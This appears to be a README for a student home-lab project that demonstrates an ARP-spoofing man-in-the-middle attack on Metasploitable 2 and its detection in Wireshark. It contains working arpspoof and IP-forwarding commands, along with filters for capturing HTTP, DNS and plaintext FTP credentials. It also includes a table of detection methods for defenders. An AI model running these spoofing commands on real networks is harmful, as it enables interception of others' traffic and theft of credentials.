# 🔐 Project 1: ARP Spoofing + MITM Attack
> Capturing and analyzing a real Man-in-the-Middle attack using Kali Linux, Wireshark, and Metasploitable 2

---

## 📹 Project Demo Video
🎥 **[Watch the full attack walkthrough here →](YOUR_LOOM_OR_YOUTUBE_LINK)**

> This video covers the complete attack from setup to execution — including live Wireshark packet capture, ARP spoofing, HTTP interception, FTP credential sniffing, DNS query capture, and TCP stream analysis.

---

## 📌 Project Overview

This project demonstrates a **Man-in-the-Middle (MITM) attack** using ARP Spoofing on a controlled home lab environment. The goal was to understand how attackers position themselves between a victim and a gateway to intercept all network traffic — and also how defenders can detect this attack using Wireshark.

This project covers **both the attacker perspective (Red Team) and the defender perspective (Blue Team).**

---

## 🧪 Lab Environment

| Component | Details |
|---|---|
| Host OS | Windows (VirtualBox) |
| Attacker Machine | Kali Linux |
| Victim Machine | Metasploitable 2 |
| Network Type | Host-Only / NAT Network |
| Attacker IP | 192.168.1.119 |
| Victim IP | 192.168.1.3 |
| Gateway IP | 192.168.1.1 |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Wireshark** | Packet capture and traffic analysis |
| **arpspoof** | ARP spoofing attack tool (part of dsniff) |
| **curl** | Generating HTTP traffic from victim |
| **ftp** | Generating plaintext credential traffic |
| **Kali Linux** | Attacker operating system |
| **Metasploitable 2** | Intentionally vulnerable victim machine |

---

## ⚙️ What is ARP Spoofing?

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network. ARP Spoofing is an attack where the attacker sends **fake ARP reply packets** to both the victim and the gateway, claiming to be each other.

```
Normal traffic flow:
Victim → Gateway → Internet

After ARP Spoofing:
Victim → Attacker (Kali) → Gateway → Internet
```

The attacker sits silently in the middle — intercepting, reading, and potentially modifying all traffic.

---

## 🚀 Attack Execution — Step by Step

### Step 1 — Enable IP Forwarding
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward  # Should print 1
```
This ensures victim traffic is forwarded properly and the attack stays silent.

### Step 2 — Start Wireshark Capture
- Open Wireshark on Kali
- Select `eth0` interface
- Start capturing before launching the attack

### Step 3 — Launch ARP Spoofing (Two Terminals)
```bash
# Terminal 1 — Tell victim that Kali is the gateway
sudo arpspoof -i eth0 -t 192.168.1.3 192.168.1.1

# Terminal 2 — Tell gateway that Kali is the victim
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.3
```

### Step 4 — Generate Traffic from Victim (Metasploitable)
```bash
curl http://neverssl.com     # HTTP traffic
ftp 192.168.1.119            # FTP plaintext credentials
ping 192.168.1.1             # ICMP traffic
```

### Step 5 — Analyze Traffic in Wireshark
Applied the following filters to analyze intercepted traffic:

```
arp                          # See fake ARP packets
ip.src == 192.168.1.3        # All victim traffic
http                         # HTTP requests intercepted
ftp                          # FTP plaintext credentials
dns                          # DNS queries from victim
arp.duplicate-address-detected  # Detect the attack
```

---

## 🔍 Key Findings

### 1. ARP Spoofing Confirmed
Wireshark detected **duplicate IP addresses** for both `192.168.1.1` and `192.168.1.3` — the same IPs were showing two different MAC addresses. Wireshark flagged this as an **Expert Info Warning**, which is exactly how a SOC analyst would detect this attack in real life.

### 2. HTTP Traffic Intercepted
Captured a full `GET / HTTP/1.1` request from the victim (192.168.1.3) to an external server (34.223.124.45). The traffic was routed through the attacker's Kali machine — confirmed by the destination MAC address matching Kali's MAC.

### 3. Full TCP Stream Visible
Using **Follow TCP Stream** in Wireshark, the complete HTTP conversation between the victim and the web server was reconstructed — including full request headers and HTML response body. All in plaintext.

### 4. DNS Queries Intercepted
Every domain the victim tried to resolve passed through the attacker — meaning the attacker could see every website the victim was visiting in real time.

### 5. Plaintext Credentials Captured (FTP)
FTP login credentials were visible in plaintext in the Wireshark capture — demonstrating exactly why unencrypted protocols are dangerous on a network.

---

## 🛡️ Blue Team — How to Detect This Attack

| Detection Method | What to Look For |
|---|---|
| Wireshark filter | `arp.duplicate-address-detected` |
| ARP table check | `arp -a` — same IP with two MACs |
| IDS/IPS tools | Snort, Suricata — ARP anomaly rules |
| Network monitoring | Sudden increase in ARP reply packets |
| VLAN segmentation | Limits ARP broadcast domain |

---

## 📸 Screenshots

| Screenshot | Description |
|---|---|
| `screenshots/01_arp_packets.png` | Fake ARP packets visible in Wireshark |
| `screenshots/02_arpspoof_terminal1.png` | arpspoof running — telling gateway I am victim |
| `screenshots/03_arpspoof_terminal2.png` | arpspoof running — telling victim I am gateway |
| `screenshots/04_http_intercept.png` | HTTP traffic from victim intercepted |
| `screenshots/05_curl_metasploitable.png` | curl running on Metasploitable, captured in Wireshark |
| `screenshots/06_duplicate_arp_detection.png` | Wireshark Expert Info Warning — duplicate IP detected |

---

## 📁 Project Files

```
ARP-Spoofing-MITM-Project/
│
├── README.md                        ← This file
├── screenshots/                     ← All Wireshark + terminal screenshots
│   ├── 01_arp_packets.png
│   ├── 02_arpspoof_terminal1.png
│   ├── 03_arpspoof_terminal2.png
│   ├── 04_http_intercept.png
│   ├── 05_curl_metasploitable.png
│   └── 06_duplicate_arp_detection.png
├── pcap/
│   └── arp_spoofing_capture.pcap    ← Full Wireshark packet capture
└── report.md                        ← Detailed findings report
```

---

## 📚 What I Learned

- How ARP works at Layer 2 of the OSI model
- How MITM attacks are executed in real networks
- How to use arpspoof to position an attacker between victim and gateway
- How to capture and analyze attack traffic using Wireshark
- How defenders detect ARP spoofing using Wireshark Expert Info warnings
- Why unencrypted protocols (HTTP, FTP, Telnet) are dangerous
- How to reconstruct full conversations using Follow TCP Stream

---

## ⚠️ Disclaimer

This project was performed in a **controlled home lab environment** using intentionally vulnerable machines. All testing was done ethically and legally on machines I own. This is purely for educational purposes to understand how network attacks work and how to defend against them.

---

## 👤 Author

**[Your Name]**
Cybersecurity Enthusiast | Networking | Ethical Hacking
- LinkedIn: [Your LinkedIn]
- GitHub: [Your GitHub]

---

*Part of my ongoing cybersecurity learning journey — building hands-on projects to develop real-world skills.*
